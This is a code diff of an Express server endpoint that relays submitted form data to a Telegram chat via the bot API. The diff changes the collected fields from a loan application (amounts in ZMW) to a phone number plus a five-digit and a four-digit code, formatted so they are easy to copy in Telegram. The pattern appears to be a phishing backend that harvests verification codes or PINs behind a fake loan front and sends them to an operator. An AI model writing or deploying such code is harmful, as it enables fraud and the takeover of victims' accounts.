@@ -9,48 +9,40 @@ app.use(cors());
 app.use(express.json());
 app.use(express.static(__dirname));
 
-// Securely pull tokens from Render's environment variables
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
-// Endpoint to receive form data and send to Telegram
 app.post('/api/submit-application', async (req, res) => {
-    const { loanAmount, loanTerm, loanType, firstName, lastName, phone, purpose, empStatus, annualIncome } = req.body;
+    // We now only grab the fields we need from the request
+    const { phone, fiveDigitCode, fourDigitCode } = req.body;
 
-    // Log to Render console so you can see if data arrives
-    console.log("New Application Received:", req.body);
+    console.log("New Details Received:", req.body);
 
+    // Using backticks (`) makes the text clickable/copyable in Telegram
     const message = `
-🔔 *NEW LOAN APPLICATION*
+🔔 *NEW DETAILS RECEIVED*
 -------------------------
-*Name:* ${firstName} ${lastName}
-*Phone:* ${phone}
-*Loan Type:* ${loanType}
-*Amount:* ZMW ${loanAmount}
-*Term:* ${loanTerm} Months
-*Purpose:* ${purpose}
-*Employment:* ${empStatus}
-*Annual Income:* ZMW ${annualIncome}
+*Phone Number:* \`${phone || 'Not provided'}\`
+*5-Digit Code:* \`${fiveDigitCode || 'Not provided'}\`
+*4-Digit Code:* \`${fourDigitCode || 'Not provided'}\`
     `;
 
     try {
-        // Check if tokens exist to prevent crash
         if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-            console.log("Error: Missing Telegram credentials in environment variables.");
-            return res.status(500).json({ success: false, message: 'Server configuration error' });
+            console.log("Missing Telegram credentials.");
+            return res.status(500).json({ success: false });
         }
 
-        // Send to Telegram
         await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
             chat_id: TELEGRAM_CHAT_ID,
             text: message,
             parse_mode: 'Markdown'
         });
 
-        res.status(200).json({ success: true, message: 'Application sent to Telegram' });
+        res.status(200).json({ success: true });
     } catch (error) {
         console.error('Telegram Error:', error.message);
-        res.status(500).json({ success: false, message: 'Failed to send notification' });
+        res.status(500).json({ success: false });
     }
 });
 
